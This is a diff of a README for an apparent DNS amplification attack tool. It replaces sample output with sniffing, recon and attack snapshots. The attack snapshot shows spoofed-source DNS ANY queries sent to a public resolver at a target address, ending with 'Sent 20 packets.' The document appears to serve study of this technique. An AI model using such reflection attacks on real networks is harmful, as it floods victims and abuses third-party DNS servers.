@@ -71,63 +71,227 @@ sudo python snifffer.py
 This returns all DNS packets that are received on the interface, similar to a Wireshark capture filtered on DNS.
 This can serve as an introduction to see which records are being requested and received, including which replies seem sufficiently large to be used as example.
 ### Snapshot //add snapshots
-#### Send packet
-```shell
-         |###[ DNS Question Record ]### 
-         |  qname     = 'qq.com'
-         |  qtype     = ALL
-         |  qclass    = IN
-        an        = None
-        ns        = None
-        ar        = None
-
-Are you sure you want to attack ? [Y]/NY
-.
-Sent 1 packets.
-```
 #### Sniffing
 ```shell
-###[ IP ]### 
-     version   = 4
-     ihl       = 5
-     tos       = 0x0
-     len       = 52
-     id        = 1
-     flags     = 
-     frag      = 0
-     ttl       = 64
-     proto     = udp
-     chksum    = 0x608a
-     src       = 10.1.0.30
-     dst       = 8.8.8.8
-     \options   \
-###[ UDP ]### 
-        sport     = domain
-        dport     = domain
-        len       = 32
-        chksum    = 0x9f30
-###[ DNS ]### 
-           id        = 0
-           qr        = 0
-           opcode    = QUERY
-           aa        = 0
-           tc        = 0
-           rd        = 1
-           ra        = 0
-           z         = 0
-           ad        = 0
-           cd        = 0
-           rcode     = ok
-           qdcount   = 1
-           ancount   = 0
-           nscount   = 0
-           arcount   = 0
-           \qd        \
-            |###[ DNS Question Record ]### 
-            |  qname     = 'qq.com.'
-            |  qtype     = ALL
-            |  qclass    = IN
-           an        = None
-           ns        = None
-           ar        = None
+#####[ Ethernet ]#####
+dst       = 00:0c:29:f9:b8:71
+src       = 38:35:fb:35:8a:8b
+type      = IPv4
+
+#####[ IP ]#####
+version   = 4
+ihl       = 5
+tos       = 0x0
+len       = 56
+id        = 43225
+flags     =
+frag      = 0
+ttl       = 122
+proto     = udp
+chksum    = 0xc60e
+src       = 8.8.8.8
+dst       = 192.168.1.21
+\options   \
+
+#####[ UDP ]#####
+sport     = domain
+dport     = domain
+len       = 36
+chksum    = 0x9637
+
+#####[ DNS ]#####
+id        = 0
+qr        = 1
+opcode    = QUERY
+aa        = 0
+tc        = 0
+rd        = 1
+ra        = 1
+z         = 0
+ad        = 0
+cd        = 0
+rcode     = ok
+qdcount   = 1
+ancount   = 0
+nscount   = 0
+arcount   = 0
+\qd       \
+
+######[ DNS Question Record ]######
+qname     = 'google.com.'
+qtype     = A
+qclass    = IN
+
+ah        = None
+ns        = None
+ar        = None
+```
+#### Recon
+```shell
+DNS server: 8.8.8.8
+Query: google.com
+Query Type: 255
+Number of IP packets: 20
+#####[ IP ]#####
+version   = 4
+ihl       = None
+tos       = 0x0
+len       = None
+id        = 1
+flags     =
+frag      = 0
+ttl       = 64
+proto     = ip
+chksum    = None
+src       = 192.168.1.21
+dst       = 8.8.8.8
+\options   \
+
+#####[ UDP ]#####
+sport     = domain
+dport     = domain
+len       = None
+chksum    = None
+
+#####[ DNS ]#####
+id        = 0
+qr        = 0
+opcode    = QUERY
+aa        = 0
+tc        = 0
+rd        = 1
+ra        = 0
+z         = 0
+ad        = 0
+cd        = 0
+rcode     = ok
+qdcount   = 1
+ancount   = 0
+nscount   = 0
+arcount   = 0
+\qd       \
+
+#####[ DNS Question Record ]#####
+qname     = 'google.com.'
+qtype     = ALL
+qclass    = IN
+
+ah        = None
+ns        = None
+ar        = None
+
+Size of initial packet: 1120
+Begin emission:
+Finished sending 20 packets.
+*********************
+Received 23 packets, got 20 answers, remaining 0 packets
+Size of returned packet: 1120
+Amplification: 1.000000
+```
+#### Attack
+```shell
+DNS server: 8.8.8.8
+Target: 172.0.0.1
+Query: google.com
+Query Type: 255
+Number of packets: 20
+#####[ IP ]#####
+version   = 4
+ihl       = None
+tos       = 0x0
+len       = None
+id        = 1
+flags     =
+frag      = 0
+ttl       = 64
+proto     = ip
+chksum    = None
+src       = 192.168.1.21
+dst       = 8.8.8.8
+\options   \
+
+#####[ UDP ]#####
+sport     = domain
+dport     = domain
+len       = None
+chksum    = None
+
+#####[ DNS ]#####
+id        = 0
+qr        = 0
+opcode    = QUERY
+aa        = 0
+tc        = 0
+rd        = 1
+ra        = 0
+z         = 0
+ad        = 0
+cd        = 0
+rcode     = ok
+qdcount   = 1
+ancount   = 0
+nscount   = 0
+arcount   = 0
+\qd       \
+
+#####[ DNS Question Record ]#####
+qname     = 'google.com.'
+qtype     = ALL
+qclass    = IN
+
+ah        = None
+ns        = None
+ar        = None
+
+#####[ IP ]#####
+version   = 4
+ihl       = None
+tos       = 0x0
+len       = None
+id        = 1
+flags     =
+frag      = 0
+ttl       = 64
+proto     = udp
+chksum    = None
+src       = 172.0.0.1
+dst       = 8.8.8.8
+\options   \
+
+#####[ UDP ]#####
+sport     = domain
+dport     = domain
+len       = None
+chksum    = None
+
+#####[ DNS ]#####
+id        = 0
+qr        = 0
+opcode    = QUERY
+aa        = 0
+tc        = 0
+rd        = 1
+ra        = 0
+z         = 0
+ad        = 0
+cd        = 0
+rcode     = ok
+qdcount   = 1
+ancount   = 0
+nscount   = 0
+arcount   = 0
+\qd       \
+
+#####[ DNS Question Record ]#####
+qname     = 'google.com.'
+qtype     = ALL
+qclass    = IN
+
+ah        = None
+ns        = None
+ar        = None
+
+Are you sure you want to attack? [Y/N]
+*********************
+Sent 20 packets.
 ```
